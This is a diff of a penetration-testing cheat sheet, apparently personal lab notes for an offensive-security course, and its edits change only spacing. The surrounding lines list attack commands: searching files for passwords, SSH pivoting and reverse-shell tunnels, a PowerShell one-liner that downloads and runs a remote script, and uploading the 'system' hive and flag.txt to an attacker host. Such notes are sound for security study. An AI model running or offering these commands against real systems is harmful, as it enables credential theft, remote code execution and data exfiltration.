@@ -60,8 +60,8 @@ findstr /si password *.xml *.ini *.txt *.config     (find word inside files type
 sudo sshuttle -r sean@10.11.1.251 10.1.1.0/24
 ssh -f -N -D 9050 sean@10.11.1.251
 
-ssh -N -R 127.0.0.1:5555:127.0.0.1:4444 victim@10.1.1.1 -f                    ("their ip":port:"our ip":port) - receiving reverse shell
-ssh -N -R 127.0.0.1:8080:127.0.0.1:8080 kali@192.168.119.243 -f               ("our ip":port:"their ip":port) - connecting server
+ssh -N -R 127.0.0.1:5555:127.0.0.1:4444 victim@10.1.1.1 -f             ("their ip":port:"our ip":port) - receiving reverse shell
+ssh -N -R 127.0.0.1:8080:127.0.0.1:8080 kali@192.168.119.243 -f        ("our ip":port:"their ip":port) - connecting server
 ```
 
 ## Scans
@@ -120,7 +120,7 @@ powershell -c "iex (new-object Net.WebClient).DownloadString("http://192.168.119
 ```
 Upload
 ```
-powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.119.243/uploads.php', 'system')             (need start apache2)
+powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.119.243/uploads.php', 'system')      (need start apache2)
 pscp.exe flag.txt kali@192.168.119.243:/home/kali
 ftp offsec:offsec
 ```
